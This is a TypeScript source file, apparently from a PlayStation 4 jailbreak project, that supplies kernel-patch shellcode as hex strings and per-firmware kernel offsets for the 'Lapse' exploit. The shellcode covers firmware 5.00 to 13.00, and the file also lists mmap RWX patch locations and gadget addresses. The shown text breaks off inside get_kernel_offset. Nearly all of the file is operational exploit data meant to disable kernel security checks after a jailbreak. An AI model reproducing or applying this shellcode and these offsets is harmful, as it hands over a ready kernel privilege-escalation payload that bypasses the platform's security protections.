import { BigInt, mem, fn, utils, syscalls } from 'download0/types'

/** *** kernel_offset.js *****/

// PS4 Kernel Offsets for Lapse exploit
// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py

// Kernel patch shellcode (hex strings) - patches security checks in kernel
// These are executed via kexec after jailbreak to enable full functionality
const kpatch_shellcode = {
  '5.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6816da31e00ebc681b1a31e00ebc6812da41e00ebc68171a41e00ebc6810da61e00ebc6813daa1e00ebc681fdaa1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9f83a1a00664489812a7e2300c78150232b004831c0c3c68110d5130037c68113d5130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3',
  '5.03': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb04000041b890e9ffff4881c2a0320100c681bd0a0000ebc6817da41e00ebc681c1a41e00ebc6813da51e00ebc68181a51e00ebc6811da71e00ebc6814dab1e00ebc6810dac1e00ebc7819304000000000000c681c5040000eb668981bc0400006689b1b8040000c6817d4a0500eb6689b9083c1a00664489813a7f2300c78120262b004831c0c3c68120d6130037c68123d6130037c78120c807010200000048899128c80701c7814cc80701010000000f20c0480d000001000f22c031c0c3',
  '5.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc6810d594000ebc68151594000ebc681cd594000ebc681115a4000ebc681bd5b4000ebc6816d604000ebc6813d614000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781300140004831c0c3c681d9253c0037c681dc253c0037c781d05e110102000000488991d85e1101c781fc5e1101010000000f20c0480d000001000f22c031c0c3',
  '5.53': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc6810d584000ebc68151584000ebc681cd584000ebc68111594000ebc681bd5a4000ebc6816d5f4000ebc6813d604000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781300040004831c0c3c681d9243c0037c681dc243c0037c781d05e110102000000488991d85e1101c781fc5e1101010000000f20c0480d000001000f22c031c0c3',
  '5.55': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2ccad0000c681ed0a0000ebc681cd5b4000ebc681115c4000ebc6818d5c4000ebc681d15c4000ebc6817d5e4000ebc6812d634000ebc681fd634000ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681cd070100eb6644898198ee0200664489890a390600c781f00340004831c0c3c68199283c0037c6819c283c0037c781d0ae110102000000488991d8ae1101c781fcae1101010000000f20c0480d000001000f22c031c0c3',
  '5.56': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c209ef0300c681dd0a0000ebc6814d461100ebc68191461100ebc6810d471100ebc68151471100ebc681fd481100ebc681ad4d1100ebc6817d4e1100ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681ed900200eb6644898158223500664489895af62700c78110a801004831c0c3c6816d02240037c6817002240037c78150b711010200000048899158b71101c7817cb71101010000000f20c0480d000001000f22c031c0c3',
  '6.20': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b890e9ffffbeeb000000bfeb00000041b8eb04000041b990e9ffff4881c2aebc0200c681dd0a0000ebc6814d461100ebc68191461100ebc6810d471100ebc68151471100ebc681fd481100ebc681ad4d1100ebc6817d4e1100ebc7819004000000000000668981c60400006689b1bd0400006689b9b9040000c681ed900200eb6644898178223500664489897af62700c78110a801004831c0c3c6816d02240037c6817002240037c78150f711010200000048899158f71101c7817cf71101010000000f20c0480d000001000f22c031c0c3',
  '6.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb0000006689810ec5630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c24da31500c681cd0a0000ebc6814d113c00ebc68191113c00ebc6810d123c00ebc68151123c00ebc681fd133c00ebc681ad183c00ebc6817d193c00eb6689b10fce6300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c68127bb1000eb66448991081a4500664489991e801d00668981aa851d00c781209f41004831c0c3c6817ab50a0037c6817db50a0037c78110d211010200000048899118d21101c7813cd21101010000000f20c0480d000001000f22c031c0c3',
  '6.70': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981cec8630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c25dcf0900c681cd0a0000ebc681fd143c00ebc68141153c00ebc681bd153c00ebc68101163c00ebc681ad173c00ebc6815d1c3c00ebc6812d1d3c00eb6689b1cfd16300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c681d7be1000eb66448991b81d450066448999ce831d006689815a891d00c781d0a241004831c0c3c6817ab50a0037c6817db50a0037c78110e211010200000048899118e21101c7813ce21101010000000f20c0480d000001000f22c031c0c3',
  '7.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981ceac630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c2d2af0600c681cd0a0000ebc6818def0200ebc681d1ef0200ebc6814df00200ebc68191f00200ebc6813df20200ebc681edf60200ebc681bdf70200eb6689b1efb56300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c681777b0800eb66448991084c260066448999c14e09006689817b540900c781202c2f004831c0c3c68136231d0037c68139231d0037c781705812010200000048899178581201c7819c581201010000000f20c0480d000001000f22c031c0c3',
  '7.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb0000006689819473630041b9eb00000041baeb04000041bb90e9ffffb890e9ffff4881c282f60100c681dd0a0000ebc6814df72800ebc68191f72800ebc6810df82800ebc68151f82800ebc681fdf92800ebc681adfe2800ebc6817dff2800eb6689b1cf7c6300c78190040000000000006689b9c604000066448981bd04000066448989b9040000c68127a33700eb66448991c814300066448999041e4500668981c4234500c781309a02004831c0c3c6817db10d0037c68180b10d0037c781502512010200000048899158251201c7817c251201010000000f20c0480d000001000f22c031c0c3',
  '8.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2dc600e0066898154d26200c681cd0a0000ebc6810de12500ebc68151e12500ebc681cde12500ebc68111e22500ebc681bde32500ebc6816de82500ebc6813de92500eb6689b13fdb6200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68196d63400eb664489898bc63e0066448991848d3100c6813f953100ebc781c05109004831c0c3c6813ad00f0037c6813dd00f0037c781e0c60f0102000000488991e8c60f01c7810cc70f01010000000f20c0480d000001000f22c031c0c3',
  '8.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c24d7f0c0066898174466200c681cd0a0000ebc6813d403a00ebc68181403a00ebc681fd403a00ebc68141413a00ebc681ed423a00ebc6819d473a00ebc6816d483a00eb6689b15f4f6200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681d6f32200eb66448989dbd614006644899174740100c6812f7c0100ebc78140d03a004831c0c3c681ea26080037c681ed26080037c781d0c70f0102000000488991d8c70f01c781fcc70f01010000000f20c0480d000001000f22c031c0c3',
  '9.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3',
  '9.03': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3',
  '9.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3',
  '10.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3',
  '10.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3',
  '11.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3',
  '11.02': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3',
  '11.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '12.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '12.50': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689812cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900eb668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b00b8eb04000041b9eb00000041baeb0000006689814cc12f0041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900eb668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
}

// Mmap RWX patch offsets per firmware (for verification)
// These are the offsets where 0x33 is patched to 0x37
const kpatch_mmap_offsets: Record<string, [number, number]> = {
  // TODO: missing 5.00 to 8.50
  '5.55': [0x3c2899, 0x3c289c],   // TODO: verify
  '5.56': [0x24026d, 0x240270],   // TODO: verify
  '6.00': [0x24026d, 0x240270],   // TODO: verify
  '6.20': [0x24026d, 0x240270],   // TODO: verify
  '6.50': [0xab57a, 0xab57d],     // TODO: verify
  '6.70': [0xab57a, 0xab57d],     // TODO: verify
  '7.00': [0x1d2336, 0x1d2339],   // TODO: verify
  '7.50': [0xdb17d, 0xdb180],     // TODO: verify
  '8.00': [0xfd03a, 0xfd03d],     // TODO: verify
  '8.50': [0x826ea, 0x826ed],     // TODO: verify
  '9.00': [0x16632a, 0x16632d],   // TODO: verify
  '9.03': [0x1662da, 0x1662dd],   // TODO: verify
  '9.50': [0x122d7a, 0x122d7d],   // TODO: verify
  '10.00': [0xed59a, 0xed59d],    // TODO: verify
  '10.50': [0x19c42a, 0x19c42d],  // TODO: verify
  '11.00': [0x15626a, 0x15626d],
  '11.02': [0x15628a, 0x15628d],
  '11.50': [0x1fa63a, 0x1fa63d],
  '12.00': [0x1fa71a, 0x1fa71d],
  '12.50': [0x1fa75a, 0x1fa75d],
  '13.00': [0x1fa77a, 0x1fa77d],
  '13.02': [0x1fa78a, 0x1fa78d],
}

const shellcode_fw_map = {
  '5.00': '5.00',
  '5.01': '5.00',
  '5.03': '5.03',
  '5.05': '5.03',
  '5.07': '5.03',
  '5.50': '5.50',
  '5.53': '5.53',
  '5.55': '5.55',
  '5.56': '5.56',
  '6.00': '6.00',
  '6.02': '6.00',
  '6.20': '6.20',
  '6.50': '6.50',
  '6.51': '6.50',
  '6.70': '6.70',
  '6.71': '6.70',
  '6.72': '6.70',
  '7.00': '7.00',
  '7.01': '7.00',
  '7.02': '7.00',
  '7.50': '7.50',
  '7.51': '7.50',
  '7.55': '7.50',
  '8.00': '8.00',
  '8.01': '8.00',
  '8.03': '8.00',
  '8.50': '8.50',
  '8.52': '8.50',
  '9.00': '9.00',
  '9.03': '9.03',
  '9.04': '9.03',
  '9.50': '9.50',
  '9.51': '9.50',
  '9.60': '9.50',
  '10.00': '10.00',
  '10.01': '10.00',
  '10.50': '10.50',
  '10.70': '10.50',
  '10.71': '10.50',
  '11.00': '11.00',
  '11.02': '11.02',
  '11.50': '11.50',
  '11.52': '11.50',
  '12.00': '12.00',
  '12.02': '12.00',
  '12.50': '12.50',
  '12.52': '12.50',
  '13.00': '13.00',
}

export function get_mmap_patch_offsets (fw_version: string): [number, number] | null {
  // Normalize version
  let lookup = fw_version
  if (fw_version === '9.04') lookup = '9.03'
  else if (fw_version === '9.51' || fw_version === '9.60') lookup = '9.50'
  else if (fw_version === '10.01') lookup = '10.00'
  else if (fw_version === '10.70' || fw_version === '10.71') lookup = '10.50'
  else if (fw_version === '11.52') lookup = '11.50'
  else if (fw_version === '12.02') lookup = '12.00'
  else if (fw_version === '12.52') lookup = '12.50'
  else if (fw_version === '13.04') lookup = '13.02'

  return kpatch_mmap_offsets[lookup as keyof typeof kpatch_mmap_offsets] || null
}

// Helper to convert hex string to byte array
function hexToBytes (hex: string) {
  const bytes = []
  for (let i = 0; i < hex.length; i += 2) {
    bytes.push(parseInt(hex.slice(i, i + 2), 16))
  }
  return bytes
}

// Get kernel patch shellcode for firmware version
function get_kpatch_shellcode (fw_version: string) {
  const hex = kpatch_shellcode[shellcode_fw_map[fw_version as keyof typeof shellcode_fw_map] as keyof typeof kpatch_shellcode]
  if (!hex) {
    return null
  }
  return hexToBytes(hex)
}

// Firmware-specific offsets for PS4

const offset_ps4_5_00 = {             // AND 5.01
  EVF_OFFSET: 0X7B3ED4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C19F0,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

const offset_ps4_5_03 = {
  EVF_OFFSET: 0X7B42E4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C1A70,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

const offset_ps4_5_05 = {             // AND 5.07
  EVF_OFFSET: 0X7B42A4,
  PRISON0: 0X10986A0,
  ROOTVNODE: 0X22C1A70,
  SYSENT_661: 0X1084200,
  JMP_RSI_GADGET: 0X13460
}

const offset_ps4_5_50 = {
  EVF_OFFSET: 0X80EF12,
  PRISON0: 0X1134180,
  ROOTVNODE: 0X22EF570,
  SYSENT_661: 0X111D8B0,
  JMP_RSI_GADGET: 0XAF8C
}

const offset_ps4_5_53 = {
  EVF_OFFSET: 0X80EDE2,
  PRISON0: 0X1134180,
  ROOTVNODE: 0X22EF570,
  SYSENT_661: 0X111D8B0,
  JMP_RSI_GADGET: 0XAF8C
}

const offset_ps4_5_55 = {
  EVF_OFFSET: 0X80F482,
  PRISON0: 0X1139180,
  ROOTVNODE: 0X22F3570,
  SYSENT_661: 0X11228B0,
  JMP_RSI_GADGET: 0XAF8C
}

const offset_ps4_5_56 = {
  EVF_OFFSET: 0X7C8971,
  PRISON0: 0X1139180,
  ROOTVNODE: 0X22F3570,
  SYSENT_661: 0X1123130,
  JMP_RSI_GADGET: 0X3F0C9
}

const offset_ps4_6_00 = {             // AND 6.02
  EVF_OFFSET: 0X7C8971,
  PRISON0: 0X1139458,
  ROOTVNODE: 0X21BFAC0,
  SYSENT_661: 0X1123130,
  JMP_RSI_GADGET: 0X3F0C9
}

const offset_ps4_6_20 = {
  EVF_OFFSET: 0X7C8E31,
  PRISON0: 0X113D458,
  ROOTVNODE: 0X21C3AC0,
  SYSENT_661: 0X1127130,
  JMP_RSI_GADGET: 0X2BE6E
}

const offset_ps4_6_50 = {
  EVF_OFFSET: 0X7C6019,
  PRISON0: 0X113D4F8,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1124BF0,
  JMP_RSI_GADGET: 0X15A50D
}

const offset_ps4_6_51 = {
  EVF_OFFSET: 0X7C6099,
  PRISON0: 0X113D4F8,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1124BF0,
  JMP_RSI_GADGET: 0X15A50D
}

const offset_ps4_6_70 = {             // AND 6.71, 6.72
  EVF_OFFSET: 0X7C7829,
  PRISON0: 0X113E518,
  ROOTVNODE: 0X2300320,
  SYSENT_661: 0X1125BF0,
  JMP_RSI_GADGET: 0X9D11D
}

const offset_ps4_7_00 = {             // AND 7.01, 7.02
  EVF_OFFSET: 0X7F92CB,
  PRISON0: 0X113E398,
  ROOTVNODE: 0X22C5750,
  SYSENT_661: 0X112D250,
  JMP_RSI_GADGET: 0X6B192
}

const offset_ps4_7_50 = {
  EVF_OFFSET: 0X79A92E,
  PRISON0: 0X113B728,
  ROOTVNODE: 0X1B463E0,
  SYSENT_661: 0X1129F30,
  JMP_RSI_GADGET: 0X1F842
}

const offset_ps4_7_51 = {             // AND 7.55
  EVF_OFFSET: 0X79A96E,
  PRISON0: 0X113B728,
  ROOTVNODE: 0X1B463E0,
  SYSENT_661: 0X1129F30,
  JMP_RSI_GADGET: 0X1F842
}

const offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
  EVF_OFFSET: 0X7EDCFF,
  PRISON0: 0X111A7D0,
  ROOTVNODE: 0X1B8C730,
  SYSENT_661: 0X11040C0,
  JMP_RSI_GADGET: 0XE629C
}

const offset_ps4_8_50 = {             // AND 8.52
  EVF_OFFSET: 0X7DA91C,
  PRISON0: 0X111A8F0,
  ROOTVNODE: 0X1C66150,
  SYSENT_661: 0X11041B0,
  JMP_RSI_GADGET: 0XC810D
}

const offset_ps4_9_00 = {
  EVF_OFFSET: 0x7F6F27,
  PRISON0: 0x111F870,
  ROOTVNODE: 0x21EFF20,
  TARGET_ID_OFFSET: 0x221688D,
  SYSENT_661: 0x1107F00,
  JMP_RSI_GADGET: 0x4C7AD,
  KL_LOCK: 0x3977F0,

}

const offset_ps4_9_03 = {
  EVF_OFFSET: 0x7F4CE7,
  PRISON0: 0x111B840,
  ROOTVNODE: 0x21EBF20,
  TARGET_ID_OFFSET: 0x221288D,
  SYSENT_661: 0x1103F00,
  JMP_RSI_GADGET: 0x5325B,
  KL_LOCK: 0x3959F0,
}

const offset_ps4_9_50 = {
  EVF_OFFSET: 0x769A88,
  PRISON0: 0x11137D0,
  ROOTVNODE: 0x21A6C30,
  TARGET_ID_OFFSET: 0x221A40D,
  SYSENT_661: 0x1100EE0,
  JMP_RSI_GADGET: 0x15A6D,
  KL_LOCK: 0x85EE0,
}

const offset_ps4_10_00 = {
  EVF_OFFSET: 0x7B5133,
  PRISON0: 0x111B8B0,
  ROOTVNODE: 0x1B25BD0,
  TARGET_ID_OFFSET: 0x1B9E08D,
  SYSENT_661: 0x110A980,
  JMP_RSI_GADGET: 0x68B1,
  KL_LOCK: 0x45B10,
}

const offset_ps4_10_50 = {
  EVF_OFFSET: 0x7A7B14,
  PRISON0: 0x111B910,
  ROOTVNODE: 0x1BF81F0,
  TARGET_ID_OFFSET: 0x1BE460D,
  SYSENT_661: 0x110A5B0,
  JMP_RSI_GADGET: 0x50DED,
  KL_LOCK: 0x25E330,
}

const offset_ps4_11_00 = {
  EVF_OFFSET: 0x7FC26F,
  PRISON0: 0x111F830,
  ROOTVNODE: 0x2116640,
  TARGET_ID_OFFSET: 0x221C60D,
  SYSENT_661: 0x1109350,
  JMP_RSI_GADGET: 0x71A21,
  KL_LOCK: 0x58F10,
}

const offset_ps4_11_02 = {
  EVF_OFFSET: 0x7FC22F,
  PRISON0: 0x111F830,
  ROOTVNODE: 0x2116640,
  TARGET_ID_OFFSET: 0x221C60D,
  SYSENT_661: 0x1109350,
  JMP_RSI_GADGET: 0x71A21,
  KL_LOCK: 0x58F10,
}

const offset_ps4_11_50 = {
  EVF_OFFSET: 0x784318,
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x21CC60D,
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x704D5,
  KL_LOCK: 0xE6C20,
}

const offset_ps4_12_00 = {            // AND 12.02
  EVF_OFFSET: 0x784798,
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x21CC60D,
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x47B31,
  KL_LOCK: 0xE6C20,
}

const offset_ps4_12_50 = {        // AND 12.52, 13.00
  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
  PRISON0: 0x111FA18,
  ROOTVNODE: 0x2136E90,
  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
  SYSENT_661: 0x110A760,
  JMP_RSI_GADGET: 0x47B31,
  KL_LOCK: 0xE6C20,
}

// Map firmware versions to offset objects
export const ps4_kernel_offset_list = {
  '5.00': offset_ps4_5_00,
  '5.01': offset_ps4_5_00,
  '5.03': offset_ps4_5_03,
  '5.05': offset_ps4_5_05,
  '5.07': offset_ps4_5_05,
  '5.50': offset_ps4_5_50,
  '5.53': offset_ps4_5_53,
  '5.55': offset_ps4_5_55,
  '5.56': offset_ps4_5_56,
  '6.00': offset_ps4_6_00,
  '6.02': offset_ps4_6_00,
  '6.20': offset_ps4_6_20,
  '6.50': offset_ps4_6_50,
  '6.51': offset_ps4_6_51,
  '6.70': offset_ps4_6_70,
  '6.71': offset_ps4_6_70,
  '6.72': offset_ps4_6_70,
  '7.00': offset_ps4_7_00,
  '7.01': offset_ps4_7_00,
  '7.02': offset_ps4_7_00,
  '7.50': offset_ps4_7_50,
  '7.51': offset_ps4_7_51,
  '7.55': offset_ps4_7_51,
  '8.00': offset_ps4_8_00,
  '8.01': offset_ps4_8_00,
  '8.02': offset_ps4_8_00,
  '8.03': offset_ps4_8_00,
  '8.50': offset_ps4_8_50,
  '8.52': offset_ps4_8_50,
  '9.00': offset_ps4_9_00,
  '9.03': offset_ps4_9_03,
  '9.04': offset_ps4_9_03,
  '9.50': offset_ps4_9_50,
  '9.51': offset_ps4_9_50,
  '9.60': offset_ps4_9_50,
  '10.00': offset_ps4_10_00,
  '10.01': offset_ps4_10_00,
  '10.50': offset_ps4_10_50,
  '10.70': offset_ps4_10_50,
  '10.71': offset_ps4_10_50,
  '11.00': offset_ps4_11_00,
  '11.02': offset_ps4_11_02,
  '11.50': offset_ps4_11_50,
  '11.52': offset_ps4_11_50,
  '12.00': offset_ps4_12_00,
  '12.02': offset_ps4_12_00,
  '12.50': offset_ps4_12_50,
  '12.52': offset_ps4_12_50,
  '13.00': offset_ps4_12_50,
}

let kernel_offset: (typeof ps4_kernel_offset_list[keyof typeof ps4_kernel_offset_list]) & {
  PROC_FD?: number,
  PROC_PID?: number,
  PROC_VM_SPACE?: number,
  PROC_UCRED?: number,
  PROC_COMM?: number,
  PROC_SYSENT?: number,
  FILEDESC_OFILES?: number,
  SIZEOF_OFILES?: number,
  VMSPACE_VM_PMAP?: number,
  PMAP_CR3?: number,
  SO_PCB?: number,
  INPCB_PKTOPTS?: number,
  IP6PO_TCLASS?: number,
  IP6PO_RTHDR?: number,
} | null = null // Global

export function get_kernel_offset (FW_VERSION: string) {
  const fw_offsets = ps4_kernel_offset_list[FW_VERSION as keyof typeof ps4_kernel_offset_list]

  if (!fw_offsets) {
    throw new Error('Unsupported PS4 firmware version: ' + FW_VERSION)
  }

  kernel_offset = fw_offsets

  // PS4-specific proc structure offsets
  kernel_offset.PROC_FD = 0x48
  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
  kernel_offset.PROC_VM_SPACE = 0x200
  kernel_offset.PROC_UCRED = 0x40
  kernel_offset.PROC_COMM = -1        // Found dynamically
  kernel_offset.PROC_SYSENT = -1      // Found dynamically

  // filedesc - PS4 different from PS5
  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30

  // vmspace structure
  kernel_offset.VMSPACE_VM_PMAP = -1

  // pmap structure
